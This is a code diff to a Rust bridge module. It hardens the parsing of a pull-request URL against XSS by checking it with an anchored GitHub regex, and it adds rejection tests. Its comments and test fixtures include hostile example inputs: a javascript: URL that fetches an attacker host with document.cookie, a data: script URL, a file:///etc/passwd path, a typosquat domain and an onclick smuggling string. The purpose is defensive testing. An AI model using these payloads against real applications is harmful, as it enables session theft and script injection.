@@ -23,12 +23,40 @@
 //! is `@synapti/trail-capture` (resolved via PATH; the user can override to a
 //! local node_modules/.bin/trail or an absolute path).
 
+use regex::Regex;
 use serde::{Deserialize, Serialize};
 use std::path::Path;
 use std::process::{Command, Stdio};
+use std::sync::OnceLock;
 use std::time::{Duration, Instant};
 use thiserror::Error;
 use tracing::warn;
+
+/// Anchored GitHub PR URL regex (v0.1.1 B1: XSS hardening).
+///
+/// The capture CLI's stderr is parsed into `pr_url` and rendered by
+/// `PacketView.tsx` as `<a href={postToast.pr_url}>`. A compromised or
+/// PATH-hijacked `@synapti/trail-capture` could emit
+/// `posted packet to javascript:fetch('https://attacker/exfil?'+document.cookie)`
+/// — a single click on the post-success toast would execute script inside
+/// the webview (the CSP at `tauri.conf.json` does NOT block `javascript:`
+/// hrefs). Anchor + structural check refuses anything that doesn't look
+/// like a real `https://github.com/<owner>/<repo>/pull/<N>` URL at the
+/// Rust boundary so the renderer never sees a hostile string. Mirrored
+/// by `postToPrResponseSchema.pr_url` regex on the JS side.
+fn github_pr_url_regex() -> &'static Regex {
+    static RE: OnceLock<Regex> = OnceLock::new();
+    RE.get_or_init(|| {
+        Regex::new(
+            r"^https://github\.com/[A-Za-z0-9._-]+/[A-Za-z0-9._-]+/pull/[1-9][0-9]*(?:/|\?[^\s]*)?$",
+        )
+        .expect("github_pr_url_regex compiles")
+    })
+}
+
+fn is_github_pr_url(s: &str) -> bool {
+    !s.is_empty() && s.len() <= 512 && github_pr_url_regex().is_match(s)
+}
 
 #[derive(Debug, Error)]
 pub enum BridgeError {
@@ -301,7 +329,16 @@ fn parse_post_outcome(stderr: &str) -> Option<PacketPostOutcome> {
             }
         }
     }
-    if pr_url.is_empty() {
+    // v0.1.1 B1: refuse anything that doesn't look like a real GitHub PR
+    // URL at the Rust boundary. A compromised capture CLI emitting
+    // `posted packet to javascript:...` must not become a clickable
+    // <a href> in PacketView. The TS contract's pr_url regex is the
+    // belt-and-braces second check.
+    if !is_github_pr_url(&pr_url) {
+        warn!(
+            "parse_post_outcome: rejected non-GitHub-PR url shape (len={})",
+            pr_url.len()
+        );
         return None;
     }
     Some(PacketPostOutcome {
@@ -324,6 +361,16 @@ fn parse_decide_outcome(stderr: &str) -> Option<PacketDecideOutcome> {
             let url_marker = "posted to ";
             let url_idx = tail.find(url_marker)?;
             let pr_url = tail[url_idx + url_marker.len()..].trim().to_string();
+            // v0.1.1 B1: same XSS-hardening as parse_post_outcome — refuse
+            // non-GitHub-PR shapes at the Rust boundary so a hostile capture
+            // CLI cannot land a `javascript:` href in the decision toast.
+            if !is_github_pr_url(&pr_url) {
+                warn!(
+                    "parse_decide_outcome: rejected non-GitHub-PR url shape (len={})",
+                    pr_url.len()
+                );
+                return None;
+            }
             return Some(PacketDecideOutcome {
                 pr_url,
                 claim_id,
@@ -758,7 +805,9 @@ mod tests {
 
     #[test]
     fn parse_decide_outcome_handles_stable_id_claim() {
-        let stderr = "decision recorded: 0123456789abcdef accept; comment + body posted to https://example.com/pr/1\n";
+        // v0.1.1 B1: the URL must look like a real github.com PR; example.com
+        // is no longer accepted (was incidental in pre-B1 fixture).
+        let stderr = "decision recorded: 0123456789abcdef accept; comment + body posted to https://github.com/synaptiai/trail/pull/1\n";
         let outcome = parse_decide_outcome(stderr).expect("must parse");
         assert_eq!(outcome.claim_id, "0123456789abcdef");
         assert_eq!(outcome.decision, "accept");
@@ -768,6 +817,96 @@ mod tests {
     fn parse_decide_outcome_returns_none_when_format_mismatch() {
         assert!(parse_decide_outcome("nothing here\n").is_none());
         assert!(parse_decide_outcome("decision recorded: only-one-token\n").is_none());
+    }
+
+    // v0.1.1 B1: XSS hardening — a compromised capture CLI emitting a
+    // javascript:/data:/file:/wrong-domain URL must be rejected at the
+    // Rust boundary so the renderer never sees it as a clickable href.
+    #[test]
+    fn parse_post_outcome_rejects_javascript_url() {
+        let stderr = "posted packet to javascript:fetch('https://attacker/exfil') (body_hash deadbeef\u{2026})\n";
+        assert!(
+            parse_post_outcome(stderr).is_none(),
+            "javascript: URL must be rejected"
+        );
+    }
+
+    #[test]
+    fn parse_post_outcome_rejects_data_url() {
+        let stderr = "posted packet to data:text/html;base64,PHNjcmlwdD4= (body_hash 0123\u{2026})\n";
+        assert!(parse_post_outcome(stderr).is_none(), "data: URL must be rejected");
+    }
+
+    #[test]
+    fn parse_post_outcome_rejects_file_url() {
+        let stderr = "posted packet to file:///etc/passwd\n";
+        assert!(parse_post_outcome(stderr).is_none(), "file:// URL must be rejected");
+    }
+
+    #[test]
+    fn parse_post_outcome_rejects_non_github_domain() {
+        let stderr = "posted packet to https://gitlab.com/foo/bar/pull/1\n";
+        assert!(parse_post_outcome(stderr).is_none(), "non-github.com URL must be rejected");
+    }
+
+    #[test]
+    fn parse_post_outcome_rejects_github_subdomain_typosquat() {
+        let stderr = "posted packet to https://github.com.attacker.io/foo/bar/pull/1\n";
+        assert!(
+            parse_post_outcome(stderr).is_none(),
+            "github.com.attacker.io must be rejected (anchored regex)"
+        );
+    }
+
+    #[test]
+    fn parse_post_outcome_rejects_whitespace_smuggling() {
+        let stderr = "posted packet to https://github.com/foo/bar/pull/1 onclick=alert(1)\n";
+        // The post-line parser splits on " (body_hash " so this URL ends up as
+        // the full trailing string. Anchored regex rejects the embedded space.
+        assert!(
+            parse_post_outcome(stderr).is_none(),
+            "URL with whitespace smuggling must be rejected"
+        );
+    }
+
+    #[test]
+    fn parse_decide_outcome_rejects_javascript_url() {
+        let stderr = "decision recorded: CLAIM-001 block; comment + body posted to javascript:alert(1)\n";
+        assert!(
+            parse_decide_outcome(stderr).is_none(),
+            "javascript: URL in decide outcome must be rejected"
+        );
+    }
+
+    #[test]
+    fn is_github_pr_url_accepts_canonical_shapes() {
+        assert!(is_github_pr_url("https://github.com/synaptiai/trail/pull/1"));
+        assert!(is_github_pr_url("https://github.com/synaptiai/trail/pull/12345"));
+        assert!(is_github_pr_url("https://github.com/synaptiai/trail/pull/1/"));
+        assert!(is_github_pr_url("https://github.com/synaptiai/trail/pull/1?diff=split"));
+        // Owners and repos may contain dots, hyphens, underscores.
+        assert!(is_github_pr_url("https://github.com/some-org/my.repo_name/pull/9"));
+    }
+
+    #[test]
+    fn is_github_pr_url_rejects_unsafe_shapes() {
+        // Wrong scheme
+        assert!(!is_github_pr_url("http://github.com/foo/bar/pull/1"));
+        assert!(!is_github_pr_url("javascript:alert(1)"));
+        assert!(!is_github_pr_url("data:text/html,<script>"));
+        // Empty / oversize
+        assert!(!is_github_pr_url(""));
+        let oversize = format!("https://github.com/a/b/pull/{}", "1".repeat(600));
+        assert!(!is_github_pr_url(&oversize));
+        // Wrong path shape
+        assert!(!is_github_pr_url("https://github.com/foo/bar/issues/1"));
+        assert!(!is_github_pr_url("https://github.com/foo/bar/pull/"));
+        assert!(!is_github_pr_url("https://github.com/foo/bar/pull/0"));
+        // Subdomain / suffix smuggling
+        assert!(!is_github_pr_url("https://api.github.com/foo/bar/pull/1"));
+        assert!(!is_github_pr_url("https://github.com.attacker.io/foo/bar/pull/1"));
+        // Path traversal characters
+        assert!(!is_github_pr_url("https://github.com/foo/../etc/pull/1"));
     }
 
     #[test]
